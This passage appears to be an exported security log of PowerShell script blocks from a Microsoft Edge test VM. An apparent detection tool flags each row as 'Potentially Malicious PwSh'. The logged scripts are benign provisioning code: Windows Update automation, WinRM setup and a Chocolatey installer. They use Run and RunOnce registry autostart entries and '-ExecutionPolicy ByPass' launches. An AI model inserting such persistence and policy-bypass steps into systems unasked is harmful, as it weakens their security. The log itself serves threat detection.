$script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\win-updates.ps1 ¦ ScriptBlockId: 4052e313-d7e5-4d71-b720-b4142a5c8269 ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:20:50.918 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,42,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"" $RegistryEntry = ""FinishInstallActions"" $ScriptPath = ""A:\finish-actions.ps1"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -File $($script:ScriptPath)"" Restart-Computer -Force","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\post-win-updates.ps1 ¦ ScriptBlockId: 6f414bc4-ec08-46c3-ba0e-4130fd532833 ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"" $RegistryEntry = ""FinishInstallActions"" $ScriptPath = ""A:\finish-actions.ps1"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -File $($script:ScriptPath)"" Restart-Computer -Force","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:17.904 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,46,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- [System.Reflection.Assembly]::LoadWithPartialName(""System.Web.Extensions"") $json = Get-Content ""A:\build.cfg"" $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer $config = $ser.DeserializeObject($json) $software = $config.software $windows = $config.windows copy a:\build.cfg C:\bginfo # Change Browsers Home Page & A:\browser-homepage.ps1 # Start WinRM If ($windows -eq ""Win10"" -or $windows -eq ""Win81"") { & A:\start-winrm.ps1 } # Copy SSH to execute copy a:\openssh.ps1 C:\bginfo $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"" $RegistryEntry = ""FinishInstallActions"" $ScriptPath = ""c:\bginfo\openssh.ps1"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -File $($script:ScriptPath)"" Restart-Computer -Force","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\finish-actions.ps1 ¦ ScriptBlockId: e4bb90f8-1c87-4dda-80d0-06dbc9e476fb ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- [System.Reflection.Assembly]::LoadWithPartialName(""System.Web.Extensions"") $json = Get-Content ""A:\build.cfg"" $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer $config = $ser.DeserializeObject($json) $software = $config.software $windows = $config.windows copy a:\build.cfg C:\bginfo # Change Browsers Home Page & A:\browser-homepage.ps1 # Start WinRM If ($windows -eq ""Win10"" -or $windows -eq ""Win81"") { & A:\start-winrm.ps1 } # Copy SSH to execute copy a:\openssh.ps1 C:\bginfo $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"" $RegistryEntry = ""FinishInstallActions"" $ScriptPath = ""c:\bginfo\openssh.ps1"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -File $($script:ScriptPath)"" Restart-Computer -Force","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:20.299 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,47,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- $networkListManager = [Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]""{DCB00C01-570F-4A9B-8D69-199FDBA5723B}"")) $connections = $networkListManager.GetNetworkConnections() $connections | % {$_.GetNetwork().SetCategory(1)} & a:\config-winrm.cmd","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\start-winrm.ps1 ¦ ScriptBlockId: c42647be-3e67-4046-8f62-b49843ace091 ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- $networkListManager = [Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]""{DCB00C01-570F-4A9B-8D69-199FDBA5723B}"")) $connections = $networkListManager.GetNetworkConnections() $connections | % {$_.GetNetwork().SetCategory(1)} & a:\config-winrm.cmd","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:27.639 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,51,"ScriptBlock: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation 